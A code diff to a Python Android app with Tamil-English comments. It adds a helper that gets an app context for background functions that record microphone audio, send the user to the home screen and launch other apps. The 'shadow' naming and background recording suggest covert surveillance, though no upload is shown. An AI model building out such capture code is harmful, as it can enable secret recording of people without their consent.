@@ -49,6 +49,34 @@ def internet():
         return result.status_code == 200
     except Exception as error: return False
 
+def get_safe_context():
+    # 1. Cache-a bypass panna list of possible names
+    class_names = [
+        'shadow.bridge.shadow.ServiceMyservice',     # Pudhu name
+        'shaow.bridge.shadow.ServiceMyservice',      # Typo irundha idhu work aagum
+        'org.test.foregroundapp.ServiceMyservice',   # Cache clear aagalana idhu work aagum
+        'org.kivy.android.PythonService'             # Pazhaya Kivy version-a irundha idhu
+    ]
+    
+    for name in class_names:
+        try:
+            Service = autoclass(name)
+            if hasattr(Service, 'mService') and Service.mService is not None:
+                return Service.mService
+        except Exception:
+            continue
+            
+    # 2. Mela irukka Kivy classes edhuvume kidaikkalana, Android-oda Root-la irundhu App Context-a force panni edukkurom! (Idhu fail aagave aagadhu)
+    try:
+        ActivityThread = autoclass('android.app.ActivityThread')
+        return ActivityThread.currentApplication().getApplicationContext()
+    except Exception:
+        pass
+        
+    return None # Edhume kidaikkala na mattum dhaan None varum
+
+
+
 def start_recording(sec=10):
     try:
         # 1. Android Native Classes-a edukkurom (PythonActivity thevaiyillai!)
@@ -58,8 +86,7 @@ def start_recording(sec=10):
         AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
 
         # 2. Service context edukkurom (Background service-kku idhu dhaan mukkiyam)
-        PythonService = autoclass('shadow.bridge.shadow.ServiceMyservice')
-        context = PythonService.mService
+        context = get_safe_context()
         
         # 3. File save panna path ready pandrom (App-oda internal folder)
         save_dir = context.getExternalFilesDir(None).getAbsolutePath()
@@ -96,8 +123,7 @@ def go_home():
     try:
         time.sleep(2)
         Intent = autoclass('android.content.Intent')
-        PythonService = autoclass('shadow.bridge.shadow.ServiceMyservice')
-        context = PythonService.mService
+        context = get_safe_context()
         intent = Intent(Intent.ACTION_MAIN)
         intent.addCategory(Intent.CATEGORY_HOME)
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -108,8 +134,7 @@ def go_home():
 def open_app(package_name):
     try:
         time.sleep(2)
-        PythonService = autoclass('shadow.bridge.shadow.ServiceMyservice')
-        context = PythonService.mService
+        context = get_safe_context()
         pm = context.getPackageManager()
         intent = pm.getLaunchIntentForPackage(package_name)
         if intent is not None:
